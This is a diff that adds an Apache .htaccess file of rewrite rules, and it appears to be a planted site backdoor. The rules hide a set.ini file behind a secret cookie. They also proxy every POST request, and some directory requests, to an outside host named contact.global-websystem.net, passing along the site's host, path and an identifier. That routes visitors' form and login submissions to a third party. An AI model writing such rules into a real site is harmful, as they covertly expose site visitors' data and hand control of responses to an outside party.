@@ -1,0 +1,18 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_COOKIE} !.*k.e.y.4.y.o.u
+RewriteCond %{REQUEST_URI} ^(.*)set\.ini$
+RewriteRule ^(.*)$ - [R=404,L]
+
+RewriteCond %{QUERY_STRING} (^|&)form=([^&]+)($|&)
+RewriteRule .* - [E=X_QUERY_FORM:%2]
+
+RewriteCond %{REQUEST_URI} ^(.*)/$
+RewriteCond %{ENV:X_QUERY_FORM} ^[0-9]+$
+RewriteCond %{HTTP_COOKIE} !.*k.e.y.4.y.o.u
+RewriteRule ^.*$ http://contact.global-websystem.net/app/?path=%{HTTP_HOST}%{REQUEST_URI}&uid=400179691001 [QSA,P,L]
+
+RewriteCond %{HTTP_COOKIE} !.*k.e.y.4.y.o.u
+RewriteCond %{REQUEST_METHOD} ^(POST)$
+RewriteRule ^.*$ http://contact.global-websystem.net/app/?path=%{HTTP_HOST}%{REQUEST_URI}&uid=400179691001 [QSA,P,L]
+</IfModule>
